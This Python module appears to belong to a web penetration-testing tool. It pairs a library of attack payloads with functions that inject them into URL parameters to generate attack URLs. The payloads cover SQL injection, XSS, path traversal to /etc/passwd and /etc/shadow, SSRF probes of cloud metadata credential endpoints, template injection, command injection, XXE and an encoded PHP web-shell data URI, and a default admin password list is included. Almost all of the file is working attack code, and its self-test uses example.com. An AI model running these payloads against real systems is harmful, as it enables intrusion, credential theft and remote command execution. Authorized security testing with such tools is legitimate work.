from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote

# ===============================================
# PAYLOAD LIBRARY
# ===============================================

PAYLOADS = {
    "SQLi": [
        "' OR '1'='1' --",
        "' OR 1=1 --",
        "\" OR \"1\"=\"1\" --",
        "1' ORDER BY 1--",
        "1' ORDER BY 2--",
        "1' UNION SELECT NULL--",
        "1' UNION SELECT NULL,NULL--",
        "' AND SLEEP(5)--",
        "'; WAITFOR DELAY '0:0:5'--",
        "1 AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    ],
    "XSS": [
        "<script>alert(1)</script>",
        "'\"><svg/onload=alert(1)>",
        "<img src=x onerror=alert(document.domain)>",
        "<details open ontoggle=alert(1)>",
        "javascript:alert(1)",
        "'-alert(1)-'",
        "\"><iframe src=javascript:alert(1)>",
        "<body onload=alert(1)>",
    ],
    "LFI": [
        "../../../../etc/passwd",
        "../../../../etc/shadow",
        "../../../../windows/win.ini",
        "../../../../windows/system32/drivers/etc/hosts",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "../../../../etc/passwd%00",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://input",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
    ],
    "SSRF": [
        "http://127.0.0.1/",
        "http://localhost/",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://[::1]/",
        "http://0.0.0.0/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "dict://127.0.0.1:6379/info",
        "file:///etc/passwd",
        "gopher://127.0.0.1:6379/_PING%0d%0a",
    ],
    "Open Redirect": [
        "https://evil.com",
        "//evil.com",
        "///evil.com",
        "https://evil.com%2F@legit.com",
        "https:///evil.com",
        "/\\evil.com",
        "https://legit.com.evil.com",
        "%0d%0aLocation: https://evil.com",
    ],
    "SSTI": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "{{7*'7'}}",
        "{{config}}",
        "{{self.__init__.__globals__.__builtins__}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
    ],
    "IDOR": [
        "1", "2", "3", "0",
        "00000000-0000-0000-0000-000000000001",
        "../1", "1%00", "1.0",
        "-1", "999999",
    ],
    "RCE": [
        "; id",
        "| id",
        "& id",
        "; whoami",
        "`id`",
        "$(id)",
        "; cat /etc/passwd",
        "| net user",
        "\"; system('id'); //",
        "' ; id ; '",
    ],
    "Header Injection": [
        "evil.com\r\nX-Injected: header",
        "evil.com\nX-Injected: header",
        "%0d%0aX-Injected:%20header",
        "%0aX-Injected:%20header",
    ],
    "XXE": [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><root>&xxe;</root>',
    ],
    "Admin Panel": [],  # No URL injection — use credential lists
}

# Credential lists for auth endpoints
DEFAULT_CREDS = [
    ("admin",  "admin"),
    ("admin",  "password"),
    ("admin",  "123456"),
    ("admin",  "admin123"),
    ("root",   "root"),
    ("root",   "toor"),
    ("test",   "test"),
    ("user",   "user"),
    ("guest",  "guest"),
    ("admin",  ""),
]

# Params most likely injectable per vuln type
PARAM_HINTS = {
    "SQLi":          {"id", "user_id", "item", "product", "category", "sort", "order", "search", "page"},
    "XSS":           {"q", "search", "query", "input", "text", "message", "name", "comment", "s"},
    "LFI":           {"file", "path", "include", "template", "page", "document", "load", "read", "dir"},
    "SSRF":          {"url", "uri", "endpoint", "proxy", "host", "dest", "target", "fetch", "src", "webhook"},
    "Open Redirect": {"redirect", "url", "next", "return", "returnurl", "goto", "continue", "redir", "callback"},
    "SSTI":          {"template", "render", "view", "layout", "theme", "format"},
    "IDOR":          {"id", "user_id", "account_id", "order_id", "uid", "pid", "record_id"},
    "RCE":           {"cmd", "exec", "command", "run", "shell", "ping", "query", "input"},
    "Header Injection": {"host", "referer", "x-forwarded-for", "origin"},
}

# Vuln type aliases for fuzzy matching
TYPE_ALIASES = {
    "sqli":                  "SQLi",
    "sql injection":         "SQLi",
    "sql":                   "SQLi",
    "xss":                   "XSS",
    "cross-site scripting":  "XSS",
    "lfi":                   "LFI",
    "local file":            "LFI",
    "path traversal":        "LFI",
    "file inclusion":        "LFI",
    "ssrf":                  "SSRF",
    "server-side request":   "SSRF",
    "open redirect":         "Open Redirect",
    "redirect":              "Open Redirect",
    "ssti":                  "SSTI",
    "template injection":    "SSTI",
    "idor":                  "IDOR",
    "insecure direct":       "IDOR",
    "rce":                   "RCE",
    "remote code":           "RCE",
    "command injection":     "RCE",
    "header injection":      "Header Injection",
    "xxe":                   "XXE",
    "xml":                   "XXE",
    "admin":                 "Admin Panel",
    "admin panel":           "Admin Panel",
}


# ===============================================
# HELPERS
# ===============================================

def _resolve_type(vuln_type):
    """Normalize vuln type string to a canonical key."""
    key = vuln_type.lower().strip()
    for alias, canonical in TYPE_ALIASES.items():
        if alias in key:
            return canonical
    return None


def inject(url, param, payload):
    """
    Inject payload into a specific URL parameter.
    Falls back to appending ?param=payload if no param given.
    """
    if not param:
        sep = "&" if "?" in url else "?"
        return f"{url}{sep}test={quote(str(payload), safe='')}"

    try:
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [payload]
        return urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
    except Exception:
        return url


def _pick_params(url, vuln_canonical):
    """
    Return a list of params to inject into, prioritising vuln-relevant ones.
    Falls back to all params in the URL if none match.
    """
    try:
        parsed = urlparse(url)
        all_params = list(parse_qs(parsed.query).keys())
    except Exception:
        return [None]

    if not all_params:
        return [None]

    hints = PARAM_HINTS.get(vuln_canonical, set())
    priority = [p for p in all_params if p.lower() in hints]

    return priority if priority else all_params


# ===============================================
# CORE SUGGESTION ENGINE
# ===============================================

def suggest_payloads(findings):
    """
    Generate attack URL suggestions for a list of findings.

    Args:
        findings: list of dicts with keys: type, url, (optional) param

    Returns:
        list of suggestion dicts, each with:
            type, url, param, attack_urls, notes
    """
    print(f"\n[+] Generating payload suggestions for {len(findings)} findings...\n")

    suggestions = []

    for f in findings:
        vuln_type = f.get("type", "")
        url       = f.get("url", "")
        hint_param = f.get("param")  # Caller can hint which param to target

        if not url:
            continue

        canonical = _resolve_type(vuln_type)

        entry = {
            "type":        vuln_type,
            "canonical":   canonical,
            "url":         url,
            "param":       hint_param,
            "attack_urls": [],
            "notes":       []
        }

        print(f"  Target : {url}")
        print(f"  Type   : {vuln_type}" + (f" → {canonical}" if canonical else " (no match)"))

        # ── Admin Panel ──────────────────────────────
        if canonical == "Admin Panel" or "admin" in url.lower():
            entry["notes"].append("Test default credentials:")
            for user, pwd in DEFAULT_CREDS:
                cred = f"{user}:{pwd}" if pwd else f"{user}:(empty)"
                entry["notes"].append(f"  {cred}")
            print("  → Default credential list appended")

        # ── Vuln types with URL payloads ─────────────
        elif canonical and canonical in PAYLOADS:
            params = [hint_param] if hint_param else _pick_params(url, canonical)

            for param in params[:3]:  # Max 3 params per finding to keep output clean
                for payload in PAYLOADS[canonical]:
                    attack_url = inject(url, param, payload)
                    entry["attack_urls"].append({
                        "param":   param,
                        "payload": payload,
                        "url":     attack_url
                    })

            # Print sample (first 5)
            for item in entry["attack_urls"][:5]:
                print(f"  [{item['param']}] {item['url']}")
            if len(entry["attack_urls"]) > 5:
                print(f"  ... and {len(entry['attack_urls']) - 5} more")

        else:
            entry["notes"].append("No specific payload set — manual review recommended")
            print("  → No payload set matched")

        print()
        suggestions.append(entry)

    print(f"[+] Suggestions complete: {len(suggestions)} findings processed\n")
    return suggestions


# ===============================================
# ATTACK URL GENERATOR (for report/export)
# ===============================================

def generate_attack_urls(findings, max_per_finding=10):
    """
    Flat list of attack URLs across all findings.
    Useful for feeding directly into a scanner or report.

    Args:
        findings: list of finding dicts
        max_per_finding: cap URLs per finding

    Returns:
        list of dicts: {type, url, param, payload, attack_url}
    """
    all_urls = []

    for f in findings:
        canonical = _resolve_type(f.get("type", ""))
        url = f.get("url", "")
        hint_param = f.get("param")

        if not url or not canonical or canonical not in PAYLOADS:
            continue

        params = [hint_param] if hint_param else _pick_params(url, canonical)
        count = 0

        for param in params[:2]:
            for payload in PAYLOADS[canonical]:
                if count >= max_per_finding:
                    break
                all_urls.append({
                    "type":       f.get("type"),
                    "url":        url,
                    "param":      param,
                    "payload":    payload,
                    "attack_url": inject(url, param, payload)
                })
                count += 1

    return all_urls


# ===============================================
# SELF-TEST
# ===============================================

if __name__ == "__main__":
    test_findings = [
        {"type": "SQLi",         "url": "https://example.com/items?id=1&category=books"},
        {"type": "XSS",          "url": "https://example.com/search?q=hello&lang=en"},
        {"type": "LFI",          "url": "https://example.com/page?file=home.html"},
        {"type": "SSRF",         "url": "https://example.com/fetch?url=https://api.example.com"},
        {"type": "Open Redirect","url": "https://example.com/login?next=/dashboard"},
        {"type": "SSTI",         "url": "https://example.com/render?template=base"},
        {"type": "IDOR",         "url": "https://example.com/profile?user_id=42"},
        {"type": "RCE",          "url": "https://example.com/ping?host=127.0.0.1"},
        {"type": "Admin Panel",  "url": "https://example.com/admin/login"},
    ]

    results = suggest_payloads(test_findings)

    print("\n===== FLAT ATTACK URL LIST =====")
    attack_urls = generate_attack_urls(test_findings, max_per_finding=3)
    for item in attack_urls:
        print(f"  [{item['type']}] [{item['param']}] {item['attack_url']}")